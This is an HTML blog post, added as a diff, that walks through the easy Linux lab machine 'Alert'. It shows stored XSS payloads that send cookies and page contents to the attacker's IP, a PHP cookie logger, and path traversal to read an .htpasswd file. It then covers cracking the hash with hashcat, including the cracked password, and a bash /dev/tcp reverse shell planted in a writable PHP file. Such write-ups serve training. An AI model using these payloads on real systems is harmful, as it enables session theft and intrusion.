@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Linux - Easy - Alert - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Linux - Easy - Alert</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1732616527332"
+                  >2024-11-26 11:22</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1748423073005"
+                  >2025-05-28 11:04</time
+                ></span
+              >
+            </div>
+            
+            <div>
+              Keywords: 
+              <span class="keyword">xss</span>
+              
+              <span class="keyword">pathtraversal</span>
+              
+              <span class="keyword">linux</span>
+              
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<p><img src="/_resources/2d4c704947f643dbb8e557b2c542f7b2.png" /></p>
+<div><pre class="hljs"><code><span class="hljs-variable">$nmap</span> -p- -A <span class="hljs-number">10.129</span>.<span class="hljs-number">128.120</span>
+PORT      STATE    SERVICE VERSION
+<span class="hljs-number">22</span>/tcp    open     ssh     OpenSSH <span class="hljs-number">8.2</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0.<span class="hljs-number">11</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)
+| ssh-<span class="hljs-symbol">hostkey:</span> 
+|   <span class="hljs-number">3072</span> <span class="hljs-number">7</span><span class="hljs-symbol">e:</span><span class="hljs-number">46</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">c:</span><span class="hljs-number">46</span><span class="hljs-symbol">:</span><span class="hljs-number">6</span><span class="hljs-symbol">e:</span><span class="hljs-symbol">e6:</span><span class="hljs-symbol">d1:</span><span class="hljs-symbol">eb:</span><span class="hljs-number">2</span><span class="hljs-symbol">d:</span><span class="hljs-number">9</span><span class="hljs-symbol">d:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">25</span><span class="hljs-symbol">:e6</span><span class="hljs-symbol">:</span><span class="hljs-number">36</span><span class="hljs-symbol">:</span><span class="hljs-number">14</span><span class="hljs-symbol">:a7</span> (RSA)
+|   <span class="hljs-number">256</span> <span class="hljs-number">45</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">b:</span><span class="hljs-number">20</span><span class="hljs-symbol">:</span><span class="hljs-number">95</span><span class="hljs-symbol">:ec</span><span class="hljs-symbol">:</span><span class="hljs-number">17</span><span class="hljs-symbol">:c5</span><span class="hljs-symbol">:b4</span><span class="hljs-symbol">:d8</span><span class="hljs-symbol">:</span><span class="hljs-number">86</span><span class="hljs-symbol">:</span><span class="hljs-number">50</span><span class="hljs-symbol">:</span><span class="hljs-number">81</span><span class="hljs-symbol">:e0</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">c:</span><span class="hljs-symbol">e8:</span>b8 (ECDSA)
+|_  <span class="hljs-number">256</span> <span class="hljs-symbol">cb:</span><span class="hljs-number">92</span><span class="hljs-symbol">:ad</span><span class="hljs-symbol">:</span><span class="hljs-number">6</span><span class="hljs-symbol">b:</span><span class="hljs-symbol">fc:</span><span class="hljs-symbol">c8:</span><span class="hljs-number">8</span><span class="hljs-symbol">e:</span><span class="hljs-number">5</span><span class="hljs-symbol">e:</span><span class="hljs-number">9</span><span class="hljs-symbol">f:</span><span class="hljs-number">8</span><span class="hljs-symbol">c:</span><span class="hljs-symbol">a2:</span><span class="hljs-number">69</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">b:</span><span class="hljs-number">6</span><span class="hljs-symbol">d:</span><span class="hljs-symbol">d0:</span>f7 (ED25519)
+<span class="hljs-number">80</span>/tcp    open     http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">41</span> ((Ubuntu))
+|_http-<span class="hljs-symbol">title:</span> Did <span class="hljs-keyword">not</span> follow redirect to <span class="hljs-symbol">http:</span>//alert.htb/
+|_http-server-<span class="hljs-symbol">header:</span> Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">41</span> (Ubuntu)
+<span class="hljs-number">12227</span>/tcp filtered unknown
+Service <span class="hljs-symbol">Info:</span> <span class="hljs-symbol">OS:</span> Linux; <span class="hljs-symbol">CPE:</span> <span class="hljs-symbol">cpe:</span>/<span class="hljs-symbol">o:</span><span class="hljs-symbol">linux:</span>linux_kernel</code></pre></div>
+<p><img src="/_resources/75a80ef3e55f4e58a15edfbed7b50f34.png" /></p>
+<div><pre class="hljs"><code>$whatweb alert.htb
+http://alert.htb <span class="hljs-comment">[302 Found]</span> Apache<span class="hljs-comment">[2.4.41]</span>, Country<span class="hljs-comment">[RESERVED]</span><span class="hljs-comment">[ZZ]</span>, HTML5, HTTPServer<span class="hljs-comment">[Ubuntu Linux]</span><span class="hljs-comment">[Apache/2.4.41 (Ubuntu)]</span>, IP<span class="hljs-comment">[10.129.128.120]</span>, RedirectLocation<span class="hljs-comment">[index.php?page=alert]</span>, Title<span class="hljs-comment">[Alert - Markdown Viewer]</span>
+http://alert.htb/index.php?page=alert <span class="hljs-comment">[200 OK]</span> Apache<span class="hljs-comment">[2.4.41]</span>, Country<span class="hljs-comment">[RESERVED]</span><span class="hljs-comment">[ZZ]</span>, HTML5, HTTPServer<span class="hljs-comment">[Ubuntu Linux]</span><span class="hljs-comment">[Apache/2.4.41 (Ubuntu)]</span>, IP<span class="hljs-comment">[10.129.128.120]</span>, Title<span class="hljs-comment">[Alert - Markdown Viewer]</span></code></pre></div>
+<div><pre class="hljs"><code>gobuster vhost -w /usr/<span class="hljs-keyword">share</span>/wordlists/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://<span class="hljs-keyword">domain</span>.htb  <span class="hljs-comment">--append-domain -t 150</span>
+<span class="hljs-built_in">Found</span>: <span class="hljs-keyword">statistics</span>.alert.htb Status: <span class="hljs-number">401</span> [Size: <span class="hljs-number">467</span>]</code></pre></div>
+<h1 id="statisticsalerthtb">statistics.alert.htb</h1>
+<p><img src="/_resources/f36b5ee20bbd415cb3668e5f3de7b558.png" /></p>
+<h1 id="markdown-visualizer">Markdown visualizer</h1>
+<p>After uploading a file, we can see it on <code>/visualizer.php</code>.</p>
+<p><img src="/_resources/f542fb0e3f7f457cbde906c46c7fadc1.png" /></p>
+<p>Using the share button, we can get name of our file on the server.</p>
+<p><img src="/_resources/39f26ffd776c45ec8102745997f6e040.png" /></p>
+<p>Testing further, adding <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> to our file, gets us alert 1.</p>
+<p><img src="/_resources/622009d6fd7d44fe90a2f852e8b69053.png" /></p>
+<p>I was fighting with XSS to execute my file for a while, but no go. I’ve menaged to download files from my server, but not execute them. I worked on stealing cookies later, but it does</p>
+<div><pre class="hljs"><code>Test markdown
+
+<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://10.10.16.6/script.js"</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre></div>
+<div><pre class="hljs"><code><span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>().<span class="hljs-property">src</span>=<span class="hljs-string">'http://10.10.16.6/index.php?c='</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span></code></pre></div>
+<div><pre class="hljs"><code><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>])) {
+    <span class="hljs-variable">$list</span> = explode(<span class="hljs-string">";"</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>]);
+    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$list</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) {
+        <span class="hljs-variable">$cookie</span> = urldecode(<span class="hljs-variable">$value</span>);
+        <span class="hljs-variable">$file</span> = fopen(<span class="hljs-string">"cookies.txt"</span>, <span class="hljs-string">"a+"</span>);
+        fputs(<span class="hljs-variable">$file</span>, <span class="hljs-string">"Victim IP: <span class="hljs-subst">{$_SERVER['REMOTE_ADDR']}</span> | Cookie: <span class="hljs-subst">{$cookie}</span>\n"</span>);
+        fclose(<span class="hljs-variable">$file</span>);
+    }
+}
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+<p><img src="/_resources/2e7ecf40a72d44c1884667e2ded35a52.png" /></p>
+<p>I tried like a moron to get user data, and got mine.</p>
+<div><pre class="hljs"><code># Test markdown
+
+&lt;script src="http://10.10.16.6/script.js"&gt;&lt;/script&gt;
+
+&lt;script
+
+const data = {
+    cookies: document.cookie,
+    userAgent: navigator.userAgent,
+    url: <span class="hljs-keyword">window</span>.<span class="hljs-keyword">location</span>.href,
+    referrer: document.referrer,
+    platform: navigator.platform
+};
+
+<span class="hljs-keyword">fetch</span>(<span class="hljs-string">'http://10.10.16.6/'</span>, {
+    <span class="hljs-keyword">method</span>: <span class="hljs-string">'POST'</span>,
+    headers: { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span> },
+    body: <span class="hljs-type">JSON</span>.stringify(data)
+});&gt;&lt;/script&gt;</code></pre></div>
+<p>But this got me an idea, that I could use the support page and embed in the message link to the site with XSS as image. So I’ve created another markdown file.</p>
+<div><pre class="hljs"><code># Test markdown
+
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">
+<span class="hljs-title function_">fetch</span>(<span class="hljs-string">"http://alert.htb/"</span>)
+  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">text</span>())
+  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> {
+    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">"http://10.10.16.6/?data="</span> + <span class="hljs-built_in">encodeURIComponent</span>(data));
+  })
+  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"xss error:"</span>, error));
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div>
+<p>And then click share to get link. Then upload the message to support and we finally get data.</p>
+<p><img src="/_resources/01698e31532645a9861a783d9153a373.png" /></p>
+<p><img src="/_resources/b07fbe70a42c486b9c77bd0b2ebd9126.png" /></p>
+<p>Then we can see the contents using cybercheff.</p>
+<p>Progres. Then, I’ve tried path traversal on messages file, with url <code>http://alert.htb/messages.php?file=../../../../../../../../etc/apache2/sites-enabled/000-default.conf</code></p>
+<p><img src="/_resources/23d291d8af454cdc81a79f6b7a99a012.png" /></p>
+<p>Then we can look for htpasswd under <code>http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd</code>.</p>
+<p><img src="/_resources/b01bd5d5e6684644b33fceb037e39cc6.png" /></p>
+<p><img src="/_resources/3f57c40590594192966911e7f689313a.png" /></p>
+<p>We got the user and hash. <code>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ</code>. This hash is not on crackstation, so we have to run hashcat <code>hashcat -m 1600 test.hash /usr/share/wordlists/rockyou.txt</code> and we get <code>manchesterunited</code>.</p>
+<p><img src="/_resources/1435b7cb8ef64c63964e2321995e94c8.png" /></p>
+<p>We can then log in onto the site <code>http://statistics.alert.htb</code>.</p>
+<p><img src="/_resources/b4e426f659a54cd38be0121288c4e47a.png" /></p>
+<p>The same works for ssh! We are in.</p>
+<h1 id="priv-esc">Priv Esc</h1>
+<p>Running simple enum we can see that there is something on port 8080.</p>
+<p><img src="/_resources/33bbb2d6d45a43428fa4ca442f992909.png" /></p>
+<p>Running wget and cat shows us that it is a Website Monitor, so that is out target probably. Let’s pass it back to us then with <code>ssh -L 8080:localhost:8080 albert@alert.htb</code>.</p>
+<p><img src="/_resources/404f45d7ffa64a7da82f725de356e6af.png" /></p>
+<p>If we then go to <code>/opt</code> we can see our website-monitor. It has only one folder which belongs to <code>menagement</code>. Fortunetly we are in this group, <code>uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)</code>.</p>
+<p><img src="/_resources/c16b1cd9cf20426bab800920b4b625d8.png" /></p>
+<p>We can then modify it with <code>exec("/bin/bash -c 'bash -i &gt;/dev/tcp/10.10.16.6/5555 0&gt;&amp;1'");</code> so we get get reverse shell.</p>
+<div><pre class="hljs"><code><span class="hljs-meta">&lt;?php</span>
+define(<span class="hljs-string">'PATH'</span>, <span class="hljs-string">'/opt/website-monitor'</span>);
+exec(<span class="hljs-string">"/bin/bash -c 'bash -i &gt;/dev/tcp/10.10.16.6/5555 0&gt;&amp;1'"</span>);
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+<p><img src="/_resources/e919ae1c1c2246e7bf7ef6f6ada65662.png" /></p>
+<p>We are done.</p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
